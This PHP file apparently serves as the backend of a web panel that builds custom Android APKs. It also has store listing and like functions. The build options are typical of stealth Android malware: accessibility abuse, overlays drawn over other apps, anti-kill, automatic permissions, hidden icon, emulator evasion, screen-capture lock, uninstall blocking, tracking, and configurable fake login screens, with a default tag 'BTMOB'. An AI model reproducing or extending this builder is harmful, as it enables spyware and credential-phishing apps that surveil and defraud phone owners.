<?php

//this called to start building apk

require_once 'yarsap_14881.php';

require_once 'yarsap_65501.php';

function isValidAppVersion($version)
{
    // Define the regular expression pattern
    $pattern = '/^\d+(\.\d+){0,2}$/';

    // Use preg_match to check if the version matches the pattern
    if (preg_match($pattern, $version)) {
        return true;
    } else {
        return false;
    }
}

function isValidApkPackageName($packageName)
{
    // Updated pattern to allow only letters, digits, and dots
    $pattern = '/^[a-zA-Z]([a-zA-Z0-9]*[a-zA-Z0-9]+)?(\.[a-zA-Z]([a-zA-Z0-9]*[a-zA-Z0-9]+)?)+$/';

    // Check if the package name matches the pattern
    return preg_match($pattern, $packageName) === 1;
}

session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'));

    if ( !empty($data->chk) && !empty($data->subcom) && !empty($data->ran_key)) {

        try {
            $user_email = $_SESSION['session_email'] ?? 'empty';
            $user_token = $_SESSION['session_token'] ?? 'empty';
            $Sub_Command = isset($data->subcom) ? urldecode($data->subcom) : 'empty';


            $check_key = $data->chk ?? 'empty';
            $rand_call_key = $data->ran_key ?? '';
            header('Content-Type: application/json');

            list($isValid, $message) = SessionCheck($user_email, $user_token);

            if (!$isValid) {
                echo Format("Authentication failed $message", OP_Fail);
                exit();
            }


            
            if (!isset($_SESSION['nextcheck']) || $_SESSION['nextcheck'] !== $check_key) {
                echo Format("Authentication failed 2194", OP_Fail);
                BadLogin($visitoraddress, 'joinme');
                die();
            }

            if (strlen($rand_call_key) !== 32) {
                echo Format("data is not accepted", OP_Fail);
                die();
            }


            $conn = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            $stmt = $conn->prepare("SELECT userid,email FROM users WHERE email = :email AND token = :token AND token_expiration >= NOW()");
            $stmt->bindParam(':email', $user_email);
            $stmt->bindParam(':token', $user_token);
            $stmt->execute();

            $result = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($result) {
                $userid = $result['userid'];
                $useremail = $result['email'];

                try {
                    $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
                    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

                    switch ($Sub_Command) {
                        case 'build':
                            $app_id = isset($data->appid) ? urldecode($data->appid) : null;
                            $clientname = isset($data->cname) ? urldecode($data->cname) : null;
                            $buildtype = isset($data->btype) ? urldecode($data->btype) : null;

                            $allowed_btype = array("S", "C");
                            if (!in_array($buildtype, $allowed_btype)) {
                                echo Format("Unknown Build type.", OP_Fail);
                                exit();
                            }

                            $allowed_values = array("0", "1","1%7C1","1%7C0","0%7C0");
                            $use_access = isset($data->uaccess) ? (in_array($data->uaccess, $allowed_values) ? urldecode($data->uaccess) : null) : null;
                            $use_draw = isset($data->udraw) ? (in_array($data->udraw, $allowed_values) ? urldecode($data->udraw) : null) : null;
                            $use_antkill = isset($data->ukill) ? (in_array($data->ukill, $allowed_values) ? urldecode($data->ukill) : null) : null;
                            $use_atoprims = isset($data->uprims) ? (in_array($data->uprims, $allowed_values) ? urldecode($data->uprims) : null) : null;
                            $user_allprims = isset($data->allprims) ? (in_array($data->allprims, $allowed_values) ? urldecode($data->allprims) : null) : null;

                            if (
                                $app_id === null ||
                                $clientname === null ||
                                $use_access === null ||
                                $use_draw === null ||
                                $use_antkill === null ||
                                $use_atoprims === null
                            ) {
                                // Collect all parameter states for debugging
                               // $debug_info = json_encode($data);
                            
                                // Log or output detailed information
                               // error_log("Invalid Parameters Debug Info: " . $debug_info);
                                echo Format("Invalid Parameters(99).",
                                  OP_Fail);
                                exit();
                            }
                            

                            if (strlen($clientname) > 16) {
                                echo Format('Client name must not exceed 16 characters', OP_Fail);
                                die();
                            }

                            if (!isValidApkPackageName($app_id)) {
                                echo Format('App ID not Accepted.', OP_Fail);
                                die();
                            }

                            $userhost = isset($data->uhost) ? urldecode($data->uhost) : "null";
                            if ($userhost === "null") {
                                $domain = $_SERVER['SERVER_NAME'];
                                $userhost = $domain;
                            }
                            $userhost = strtolower($userhost);
                            $userhost = preg_replace('/^(https?:\/\/)?(www\.)?/', '', $userhost);

                            $notifytitle = isset($data->nottitle) ? urldecode($data->nottitle) : " ";
                            $notifymsg = isset($data->notmsg) ? urldecode($data->notmsg) : " ";

                            switch ($buildtype) {
                                case 'C':
                                    $appname = isset($data->appname) ? urldecode($data->appname) : null;
                                    if (strlen($appname) > 32) {
                                        echo Format('App name must not exceed 23 characters', OP_Fail);
                                        die();
                                    }

                                    $appversion = isset($data->appversion) ? urldecode($data->appversion) : null;
                                    if (!isValidAppVersion($appversion)) {
                                        echo Format('App Version not accepted', OP_Fail);
                                        die();
                                    }

                                    $appicopath = isset($data->icoid) ? urldecode($data->icoid) : null;
                                    $parts = explode('.', $appicopath);
                                    if (count($parts) !== 2) {
                                        echo Format("icon name not valid !.", OP_Request);
                                        exit();
                                    }

                                    $filename = $parts[0];
                                    $extension = $parts[1];

                                    if ($extension !== 'png') {
                                        echo Format("icon name not valid !!.", OP_Request);
                                        exit();
                                    }

                                    if (!preg_match('/^[a-f0-9]{32}$/', $filename)) {
                                        echo Format("icon name not valid !!!.", OP_Request);
                                        exit();
                                    }

                                    $userDirectory = '../user/storage/' . $userid . '/icons/';

                                    if (!file_exists($userDirectory . $appicopath)) {
                                        echo Format("this icon was not found", OP_Fail);
                                        exit();
                                    }

                                    $appurl = isset($data->appurl) ? urldecode($data->appurl) : null;


                                    $logintitle = isset($data->logt) ? urldecode($data->logt) : null;
                                    $logindis = isset($data->logd) ? urldecode($data->logd) : null;
                                    $loginbtn = isset($data->logb) ? urldecode($data->logb) : null;
                                    $lngshort = isset($data->loglng) ? urldecode($data->loglng) : null;





                                    $hiddenapp = isset($data->hidapp) ? urldecode($data->hidapp) : "0";
                                    $noemulator = isset($data->noemu) ? urldecode($data->noemu) : "0";
                                    $miuiautostart = isset($data->miuistart) ? urldecode($data->miuistart) : "0";

                                    $capturelock = isset($data->capscr) ? urldecode($data->capscr) : "0";

                                    $autorunback = isset($data->autoback) ? urldecode($data->autoback) : "BTMOB";
                                    $installtype = isset($data->accsstyp) ? urldecode($data->accsstyp) : "g";
                                    $hide_type = isset($data->hidtype) ? urldecode($data->hidtype) : "null";


                                    $nosleep = isset($data->slep) ? urldecode($data->slep) : "0";
                                    $trakingdata = isset($data->trakdata) ? urldecode($data->trakdata) : "empty|";
                                    
                                    $all_config = isset($data->allconf) ? urldecode($data->allconf) : "";
                                    $no_delete = isset($data->udele) ? urldecode($data->udele) : "";


                                    echo BuildCustom(
                                        $app_id,
                                        $userid,
                                        $clientname,
                                        $useremail,
                                        "empty",
                                        "empty",
                                        $userhost,
                                        $use_access,
                                        $use_draw,
                                        $use_antkill,
                                        $use_atoprims,
                                        $notifytitle,
                                        $notifymsg,
                                        $user_allprims,
                                        $buildtype,
                                        $appname,
                                        $appversion,
                                        $appicopath,
                                        $appurl,
                                        $logintitle,
                                        $logindis,
                                        $loginbtn,
                                        $lngshort,
                                        $hiddenapp,
                                        $noemulator,
                                        $miuiautostart,
                                        $autorunback,
                                        $installtype,
                                        $hide_type,
                                        $nosleep,
                                        $capturelock,
                                        $trakingdata,
                                        $all_config,
                                        $no_delete
                                    );
                                    break;

                                case 'S':
                                    $appCheckQuery = "SELECT main_activity, app_folder FROM store WHERE app_id = :appid";
                                    $appCheckStmt = $pdo->prepare($appCheckQuery);
                                    $appCheckStmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                                    $appCheckStmt->execute();
                                    $result = $appCheckStmt->fetch(PDO::FETCH_ASSOC);

                                    if (!$result) {
                                        echo Format("Error: App ID does not exist.", OP_Fail);
                                        exit();
                                    }

                                    $mainActivity = $result['main_activity'];
                                    $app_folder = $result['app_folder'];

                                    $lngshort = isset($data->loglng) ? urldecode($data->loglng) : null;


                                    $appname = isset($data->appname) ? urldecode($data->appname) : null;
                                    if (strlen($appname) > 32) {
                                        echo Format('App name must not exceed 23 characters', OP_Fail);
                                        die();
                                    }

                                    $appversion = isset($data->appversion) ? urldecode($data->appversion) : null;
                                    if (!isValidAppVersion($appversion)) {
                                        echo Format('App Version not accepted', OP_Fail);
                                        die();
                                    }

                                    $appicopath = isset($data->icoid) ? urldecode($data->icoid) : null;


                                    $appurl = isset($data->appurl) ? urldecode($data->appurl) : null;


                                    $logintitle = isset($data->logt) ? urldecode($data->logt) : null;
                                    $logindis = isset($data->logd) ? urldecode($data->logd) : null;
                                    $loginbtn = isset($data->logb) ? urldecode($data->logb) : null;
                                    $lngshort = isset($data->loglng) ? urldecode($data->loglng) : null;





                                    $hiddenapp = isset($data->hidapp) ? urldecode($data->hidapp) : "0";
                                    $noemulator = isset($data->noemu) ? urldecode($data->noemu) : "0";
                                    $miuiautostart = isset($data->miuistart) ? urldecode($data->miuistart) : "0";

                                    $capturelock = isset($data->capscr) ? urldecode($data->capscr) : "0";

                                    $autorunback = isset($data->autoback) ? urldecode($data->autoback) : "BTMOB";
                                    $installtype = isset($data->accsstyp) ? urldecode($data->accsstyp) : "g";
                                    $hide_type = isset($data->hidtype) ? urldecode($data->hidtype) : "null";


                                    $nosleep = isset($data->slep) ? urldecode($data->slep) : "0";

                                    $trakingdata = isset($data->trakdata) ? urldecode($data->trakdata) : "empty|";
                                    $all_config = isset($data->allconf) ? urldecode($data->allconf) : "";


                                    $no_delete = isset($data->udele) ? urldecode($data->udele) : "";

                                    echo BuildStore(
                                        $app_id,
                                        $userid,
                                        $clientname,
                                        $useremail,
                                        $mainActivity,
                                        $app_folder,
                                        $userhost,
                                        $use_access,
                                        $use_draw,
                                        $use_antkill,
                                        $use_atoprims,
                                        $notifytitle,
                                        $notifymsg,
                                        $user_allprims,
                                        $buildtype,
                                        $appname,
                                        $appversion,
                                        $appicopath,
                                        $appurl,
                                        $logintitle,
                                        $logindis,
                                        $loginbtn,
                                        $lngshort,
                                        $hiddenapp,
                                        $noemulator,
                                        $miuiautostart,
                                        $autorunback,
                                        $installtype,
                                        $hide_type,
                                        $nosleep,
                                        $capturelock,
                                        $trakingdata,
                                        $all_config,
                                        $no_delete
                                    );
                                    break;
                                default:
                                    echo Format("Unknown Build type 2.", OP_Fail);
                                    break;
                            }
                            break;

                        case 'load':
                            $query = "SELECT s.*
                            FROM store s";                  

                            $stmt = $pdo->prepare($query);
                            $stmt->execute();

                            $appData = $stmt->fetchAll(PDO::FETCH_ASSOC);

                            header('Content-Type: application/json');

                            if (empty($appData)) {
                                echo Format("No store apps found.", OP_Request);
                            } else {
                                $final_reply = EN_jector(json_encode($appData),$rand_call_key);
                                echo Format($final_reply, OP_Success);
                            }

                           

                            //echo Format($result, OP_Success);

                            // $result = [];
                            // header('Content-Type: application/json');
                            // echo Format($result, OP_Success);

                            break;

                        case 'like':
                            $app_id = isset($data->appid) ? urldecode($data->appid) : null;
                            if ($app_id == null) {
                                echo Format("Invalid Parameters.", OP_Fail);
                                exit();
                            }

                            $appCheckQuery = "SELECT COUNT(*) AS count FROM store WHERE app_id = :appid";
                            $appCheckStmt = $pdo->prepare($appCheckQuery);
                            $appCheckStmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                            $appCheckStmt->execute();
                            $result = $appCheckStmt->fetch(PDO::FETCH_ASSOC);

                            if ($result['count'] == 0) {
                                echo Format("Error: App ID does not exist.", OP_Fail);
                                exit();
                            }

                            $checkdoublecate = "SELECT COUNT(*) AS counts FROM store_likes WHERE app_id = :appid AND user_id = :uuid";
                            $checkdouble = $pdo->prepare($checkdoublecate);
                            $checkdouble->bindValue(':uuid', $userid, PDO::PARAM_INT);
                            $checkdouble->bindValue(':appid', $app_id, PDO::PARAM_STR);
                            $checkdouble->execute();
                            $resultdouble = $checkdouble->fetch(PDO::FETCH_ASSOC);

                            if ($resultdouble['counts'] > 0) {
                                echo Format("you already liked this app.", OP_Request);
                                exit();
                            }

                            $likequery = "INSERT INTO store_likes (like_id, user_id, app_id) VALUES (NULL, :user_id, :appid)";
                            $stmt = $pdo->prepare($likequery);
                            $stmt->bindValue(':user_id', $userid, PDO::PARAM_INT);
                            $stmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                            if ($stmt->execute()) {
                                echo Format("Like Added.", OP_Success);
                            } else {
                                echo Format("Error Adding Like.", OP_Fail);
                            }
                            break;
                        default:
                            echo Format("Invalid request (2).", OP_Fail);
                            break;
                    }
                } catch (PDOException $e) {
                    logError($e);
                    echo Format("Error (8946).", OP_Fail);
                    exit();
                }
            } else {
                echo Format("Invalid or expired token.", OP_Fail);
            }
        } catch (PDOException $e) {
            echo Format('908 Something went wrong please try again later.', OP_Fail);
            logError($e);
            echo Format("Error (4434).", OP_Fail);
        }
        $conn = null;
    } else {
        echo Format("Invalid request param.", OP_Fail);
    }
} else {
    echo Format("Invalid request.", OP_Fail);
}
